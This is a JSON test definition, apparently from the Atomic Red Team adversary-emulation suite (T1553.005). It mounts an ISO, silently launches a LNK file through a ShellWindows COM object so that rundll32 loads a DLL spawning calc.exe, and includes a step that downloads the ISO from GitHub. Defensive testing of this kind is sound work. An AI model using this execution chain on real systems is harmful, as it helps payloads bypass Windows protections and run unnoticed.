{
  "id": "c2587b8d-743d-4985-aa50-c83394eaeb68",
  "name": "Execute LNK file from ISO",
  "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "d80cf979-72e5-4b9f-acac-d0a54e3a9e7f",
      "type": "execute-command",
      "data": {
        "command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"AllTheThings\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\n$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\"))\n$instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "5c01ff56-8c8b-4ade-872f-414a9dd96a2e",
      "type": "execute-command",
      "data": {
        "command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "0aaa31fc-6ca1-42bf-921f-c5d5dee7abce",
      "name": "Check dependency 1/1",
      "description": "AllTheThings.iso must exist on disk at specified location (#{path_of_iso})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "1ca038b7-4d13-4913-a4c5-ce530ffdff49",
      "name": "Resolve dependency 1/1",
      "description": "AllTheThings.iso must exist on disk at specified location (#{path_of_iso})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso -OutFile \"#{path_of_iso}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "e202a3da-9635-4faa-b2b3-9b12f4bb8c4a",
      "name": "Re-check dependency 1/1",
      "description": "AllTheThings.iso must exist on disk at specified location (#{path_of_iso})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "d80cf979-72e5-4b9f-acac-d0a54e3a9e7f",
      "p": "on-success",
      "o": "5c01ff56-8c8b-4ade-872f-414a9dd96a2e"
    },
    {
      "s": "d80cf979-72e5-4b9f-acac-d0a54e3a9e7f",
      "p": "on-failure",
      "o": "5c01ff56-8c8b-4ade-872f-414a9dd96a2e"
    },
    {
      "s": "0aaa31fc-6ca1-42bf-921f-c5d5dee7abce",
      "p": "on-success",
      "o": "d80cf979-72e5-4b9f-acac-d0a54e3a9e7f"
    },
    {
      "s": "0aaa31fc-6ca1-42bf-921f-c5d5dee7abce",
      "p": "on-failure",
      "o": "1ca038b7-4d13-4913-a4c5-ce530ffdff49"
    },
    {
      "s": "1ca038b7-4d13-4913-a4c5-ce530ffdff49",
      "p": "on-success",
      "o": "e202a3da-9635-4faa-b2b3-9b12f4bb8c4a"
    },
    {
      "s": "e202a3da-9635-4faa-b2b3-9b12f4bb8c4a",
      "p": "on-failure",
      "o": "d80cf979-72e5-4b9f-acac-d0a54e3a9e7f"
    }
  ],
  "tags": [
    "T1553.005",
    "atomic-red-team"
  ],
